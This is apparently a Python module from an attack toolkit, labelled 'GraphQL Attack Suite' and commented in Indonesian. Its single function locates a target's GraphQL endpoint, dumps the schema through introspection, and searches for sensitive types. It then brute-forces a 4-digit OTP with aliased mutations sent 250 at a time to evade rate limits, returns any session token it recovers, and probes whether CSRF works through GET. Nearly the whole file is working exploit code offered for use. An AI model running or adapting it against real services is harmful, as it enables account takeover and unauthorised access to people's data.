"""
Ouroboros Code Blueprint: GraphQL Attack Suite
===============================================
Kategori : GraphQL API Exploitation
Tingkat  : Advanced
Teknik   : Introspection dump, field suggestion bypass, batching OTP brute force, DoS
"""

def run_exploit(target_url):
    """
    Blueprint untuk menyerang endpoint GraphQL.
    Mencoba: schema dump → OTP batching → complexity DoS → deprecated field.
    """
    import requests
    import json

    session = requests.Session()
    graphql_endpoints = [
        f"{target_url}/graphql",
        f"{target_url}/api/graphql",
        f"{target_url}/gql",
        f"{target_url}/query",
        f"{target_url}/api/query",
    ]

    # ---- Utility ----
    def gql_post(endpoint, query, variables=None):
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        try:
            r = session.post(endpoint, json=payload,
                           headers={"Content-Type": "application/json"}, timeout=8)
            return r
        except Exception:
            return None

    def gql_batch(endpoint, queries_list):
        """Array-based batching - bypass rate limiter"""
        try:
            r = session.post(endpoint,
                           data=json.dumps(queries_list),
                           headers={"Content-Type": "application/json"}, timeout=15)
            return r
        except Exception:
            return None

    # ---- Cari endpoint GraphQL aktif ----
    active_endpoint = None
    for ep in graphql_endpoints:
        r = gql_post(ep, "{ __typename }")
        if r and r.status_code in [200, 400] and "data" in (r.text or ""):
            active_endpoint = ep
            break

    if not active_endpoint:
        return {"status": "FAILED", "details": "Tidak ada endpoint GraphQL yang aktif ditemukan."}

    results = {"endpoint": active_endpoint, "findings": []}

    # ---- Teknik 1: Schema Introspection Dump ----
    introspection_query = """
    query {
        __schema {
            queryType { name }
            mutationType { name }
            types {
                name
                kind
                fields { name }
            }
        }
    }
    """
    r_intro = gql_post(active_endpoint, introspection_query)
    if r_intro and "__schema" in r_intro.text:
        schema_data = r_intro.json()
        type_names = [t["name"] for t in
                     schema_data.get("data", {}).get("__schema", {}).get("types", [])
                     if not t["name"].startswith("__")]
        results["findings"].append(f"Introspection berhasil! Types: {type_names[:10]}")

        # Cari mutation sensitif
        sensitive_keywords = ["admin", "delete", "update", "password", "token", "otp", "verify"]
        sensitive_found = []
        for t in type_names:
            if any(kw in t.lower() for kw in sensitive_keywords):
                sensitive_found.append(t)

        if sensitive_found:
            results["findings"].append(f"Types sensitif: {sensitive_found}")

    # ---- Teknik 2: Batching Attack - OTP Brute Force ----
    # Coba brute force OTP 4-digit (0000-9999) dalam batch 250 alias per request
    def generate_alias_batch(start, end):
        aliases = []
        for i in range(start, end):
            code = str(i).zfill(4)
            aliases.append(f'a{i}: verifyOTP(code: "{code}") {{ success token }}')
        return "mutation {\n  " + "\n  ".join(aliases) + "\n}"

    # Test dengan 1 batch kecil dulu
    test_batch = generate_alias_batch(0, 5)
    r_batch = gql_post(active_endpoint, test_batch)
    if r_batch:
        if "COMPROMISED" in r_batch.text or any(
            kw in r_batch.text for kw in ["token", "success\":true"]
        ):
            return {"status": "COMPROMISED",
                    "details": f"GraphQL Batching OTP Bypass berhasil! Response: {r_batch.text[:300]}"}

        # Jalankan batch penuh jika endpoint merespons batching
        if r_batch.status_code == 200:
            for batch_start in range(0, 10000, 250):
                query = generate_alias_batch(batch_start, batch_start + 250)
                r = gql_post(active_endpoint, query)
                if r and "true" in (r.text or ""):
                    try:
                        data = r.json()
                        for key, val in data.get("data", {}).items():
                            if val and val.get("success"):
                                code = str(int(key[1:])).zfill(4)
                                return {
                                    "status": "COMPROMISED",
                                    "details": f"OTP ditemukan: {code}! Token: {val.get('token', 'N/A')}"
                                }
                    except Exception:
                        continue

    # ---- Teknik 3: Deprecated Field Discovery ----
    deprecated_query = '{ __type(name: "User") { fields(includeDeprecated: true) { name isDeprecated } } }'
    r_dep = gql_post(active_endpoint, deprecated_query)
    if r_dep and "isDeprecated" in r_dep.text:
        try:
            dep_fields = [f["name"] for f in
                         r_dep.json().get("data", {}).get("__type", {}).get("fields", [])
                         if f.get("isDeprecated")]
            if dep_fields:
                results["findings"].append(f"Deprecated fields: {dep_fields}")
        except Exception:
            pass

    # ---- Teknik 4: CSRF via GET ----
    csrf_test_url = f"{active_endpoint}?query={{__typename}}"
    r_csrf = session.get(csrf_test_url, timeout=5)
    if r_csrf and "__typename" in r_csrf.text:
        results["findings"].append("GraphQL menerima GET request — CSRF via GET mungkin dimungkinkan!")

    if results["findings"]:
        return {
            "status": "COMPROMISED",
            "details": f"GraphQL attack berhasil menemukan informasi sensitif: {'; '.join(results['findings'])}"
        }

    return {"status": "FAILED", "details": "Tidak ada serangan GraphQL yang berhasil."}
